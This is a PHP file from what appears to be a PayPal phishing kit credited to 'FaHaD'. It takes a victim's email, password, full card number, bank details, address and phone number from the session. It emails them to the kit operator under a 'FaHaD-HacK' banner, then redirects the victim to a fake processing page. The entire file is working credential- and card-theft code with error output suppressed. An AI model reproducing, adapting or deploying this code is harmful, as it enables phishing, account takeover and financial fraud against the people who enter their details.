<?

error_reporting(0);
#################################################
########      Design by FaHaD            ########
#################################################

session_start();
include("../../include/__config__.php");
include("../../include/function.php");
include("lang/". $_SESSION['_lang_'].".php");

        $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
	$subject  = "PayPal Login True - [ " . $_SESSION['cntname'] . " / ".$_SESSION['_IP_']." ] ";
	$headers  = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= "From: Yeni T/Login <Tloging@mailfahad.com>";
	
	$message = "
	
<div>

======================================</font><br />
 PayPal True Login Yeni - FaHaD-HacK !</font><br />
======================================</font><br />
Client Email     : ".$_SESSION['_email_']."</font><br />
Client Password  : <font color='#FF0000'>".$_SESSION['_password_']."</font><br />
======================================</font><br />
Client Browser   : ".$browser."</font><br />
Client Country   : ".$_SESSION['cntname']."</font><br />
Client Smart     : ".$_SESSION['_smart_']."</font><br />
Client Bmlt      : ".$_SESSION['_bmlt_']."</font><br />
Client account Type : ".$_SESSION['_accounttype_']."</font><br />
Client Full card : ".$_SESSION['_card_']."</font><br />
Client Acc Addres: ".$_SESSION['_ad_']."</font><br />
Client Acc Bank  : ".$_SESSION['_bank_']."</font><br />
Client Country   : ".$_SESSION['cntname']."</font><br />
Client Phone Nb  : ".$_SESSION['_phone_']."</font><br />
Client Time      : ".$time."</font><br />
======================================</font><br />
Account Live : ".$_SESSION['_msg_']."</font><br />
======================================</font><br />
Client Agent : ".$user_agent."</font><br />
Client IP : http://www.geoiptool.com/?IP=".$_SESSION['_IP_']."</font><br />
======================================</font><br />



</font></div>";
		@mail($to,$subject,$message,$headers);
        header("Location: websc-processing.php?country.x=".$_SESSION['cntname']."-".$_SESSION['cntcode']."&lang.x=".$_SESSION['_lang_']);
?>